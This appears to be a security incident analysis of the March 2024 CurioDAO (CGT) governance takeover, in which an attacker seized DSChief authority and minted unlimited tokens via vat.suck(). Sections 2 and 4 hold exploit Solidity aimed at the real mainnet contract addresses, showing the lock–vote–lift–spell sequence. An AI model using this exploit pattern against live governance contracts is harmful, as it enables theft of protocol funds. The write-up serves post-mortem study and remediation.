# CurioDAO (CGT) — Governance Takeover and Unlimited Token Minting Analysis

| Field | Details |
|------|------|
| **Date** | 2024-03 |
| **Protocol** | CurioDAO (CGT) |
| **Chain** | Ethereum |
| **Loss** | ~998 billion CGT |
| **Vulnerable Contract** | [DSChief 0x579A3244](https://etherscan.io/address/0x579A3244f38112b8AAbefcE0227555C9b6e7aaF0) |
| **DSPause** | [0x1e692eF9](https://etherscan.io/address/0x1e692eF9cF786Ed4534d5Ca11EdBa7709602c69f) |
| **Vat** | [0x8B2B0c10](https://etherscan.io/address/0x8B2B0c101adB9C3654B226A3273e256a74688E57) |
| **CGT Token** | [0xF56b164e](https://etherscan.io/address/0xF56b164efd3CFc02BA739b719B6526A6FA1cA32a) |
| **UniV3 Router** | [0xE592427A](https://etherscan.io/address/0xE592427A0AEce92De3Edee1F18E0157C05861564) |
| **Root Cause** | In the DSChief governance system of a MakerDAO fork, the attacker locked CGT tokens → voted → lifted a malicious address to the highest authority (hat), then executed `Spell.act()` via DSPause to mint unlimited CGT and DAI using `vat.suck()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/CGT_exp.sol) |

---

## 1. Vulnerability Overview

CurioDAO is a MakerDAO fork that uses the DSChief governance system. The attacker locked a small amount of CGT into DSChief and registered themselves as the highest authority (hat) via the `vote()` → `lift()` sequence. They then executed a malicious Spell contract through DSPause, using `vat.suck()` to mint 10^12 CGT and a large amount of DAI, which were swapped into WETH/DAI and other assets via Uniswap V3.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: governance can be seized with a small amount of CGT
interface IDSChief {
    function lock(uint256 wad) external;
    function vote(address[] calldata yays) external returns (bytes32);
    function lift(address whom) external;
    function hat() external view returns (address);
}

interface IDSPause {
    function exec(address usr, bytes32 tag, bytes memory fax, uint256 eta) external returns (bytes memory);
}

interface IVat {
    // MakerDAO Vat — can mint DAI and MKR/CGT from nothing
    function suck(address u, address v, uint256 rad) external;
}

// Spell.act(): unlimited minting via vat.suck()
contract MaliciousSpell {
    function act() external {
        IVat(vat).suck(address(this), address(this), 10**9 * 10**18 * 10**27);
        ICGTToken(cgt).mint(address(this), 10**12 * 10**18);
    }
}

// ✅ Safe code: significantly raise the minimum governance lock amount
// or use a timelock delay to allow time to detect the attack
uint256 public constant MIN_GOVERNANCE_LOCK = 1_000_000e18; // minimum 1,000,000 CGT
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: CGT_decompiled.sol
contract CGT {
    function mint(address p0, uint256 p1) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Lock a small amount of CGT via DSChief.lock()
  │
  ├─→ [2] Call DSChief.vote([maliciousAddress])
  │
  ├─→ [3] DSChief.lift(maliciousAddress) — register attacker as hat
  │
  ├─→ [4] Deploy malicious Spell contract
  │         └─ act(): execute vat.suck() + cgt.mint()
  │
  ├─→ [5] Call DSPause.exec(spell, ...)
  │         └─ Execute Spell.act()
  │
  ├─→ [6] Mint 10^12 CGT + large amount of DAI
  │
  ├─→ [7] Uniswap V3: swap CGT/DAI → WETH/DAI/XCHF/OINCH/UNI/LINK
  │
  └─→ [8] Drain ~998B CGT equivalent value
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IDSChief {
    function lock(uint256 wad) external;
    function vote(address[] calldata yays) external returns (bytes32);
    function lift(address whom) external;
}

interface IDSPause {
    function exec(address usr, bytes32 tag, bytes memory fax, uint256 eta) external returns (bytes memory);
    function delay() external view returns (uint256);
    function plot(address usr, bytes32 tag, bytes memory fax, uint256 eta) external;
}

interface IVat {
    function suck(address u, address v, uint256 rad) external;
}

contract AttackSpell {
    IVat    constant vat = IVat(0x8B2B0c101adB9C3654B226A3273e256a74688E57);
    ICGT    constant cgt = ICGT(0xF56b164efd3CFc02BA739b719B6526A6FA1cA32a);

    function act() external {
        // [1] Create unlimited DAI via vat.suck
        vat.suck(address(this), address(this), 10**9 * 10**18 * 10**27);
        // [2] Directly mint CGT
        cgt.mint(address(this), 10**12 * 10**18);
    }
}

contract AttackContract {
    IDSChief constant chief = IDSChief(0x579A3244f38112b8AAbefcE0227555C9b6e7aaF0);
    IDSPause constant pause = IDSPause(0x1e692eF9cF786Ed4534d5Ca11EdBa7709602c69f);

    function testExploit() external {
        // [1] Lock a small amount of CGT and seize governance
        IERC20(cgt).approve(address(chief), lockAmount);
        chief.lock(lockAmount);

        address[] memory yays = new address[](1);
        yays[0] = address(this);
        chief.vote(yays);
        chief.lift(address(this));

        // [2] Deploy and execute Spell
        AttackSpell spell = new AttackSpell();
        bytes32 tag = extcodehash(address(spell));
        bytes memory fax = abi.encodeWithSignature("act()");
        uint256 eta = block.timestamp + pause.delay();

        pause.plot(address(spell), tag, fax, eta);
        // ... after delay
        pause.exec(address(spell), tag, fax, eta);

        // [3] Swap minted tokens via Uniswap V3
        swapToWETH();
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Governance takeover + unlimited token minting |
| **CWE** | CWE-284: Improper Access Control |
| **Attack Vector** | External (abuse of governance process) |
| **DApp Category** | MakerDAO fork governance system |
| **Impact** | Entire protocol assets drained via unlimited token minting |

## 6. Remediation Recommendations

1. **Raise minimum governance lock amount**: Set the minimum CGT lock required to register as hat to a significant percentage of total supply
2. **Extend timelock delay**: Provide sufficient delay before Spell execution to give the community time to detect and respond
3. **Quorum requirement**: Require a minimum percentage of total supply to participate in voting before a Spell can be executed
4. **vat.suck access control**: Strictly restrict `vat.suck()` calls to trusted governance addresses only

## 7. Lessons Learned

- MakerDAO forks that do not maintain the same governance parameters (minimum lock amount, timelock) as the original can have their governance seized with a minimal amount of tokens.
- `vat.suck()` is an extremely dangerous function that creates value from nothing and must only be callable through the highest-authority governance.
- Even with a governance timelock, it is meaningless without sufficient delay if the attacker can act before the community has a realistic opportunity to respond.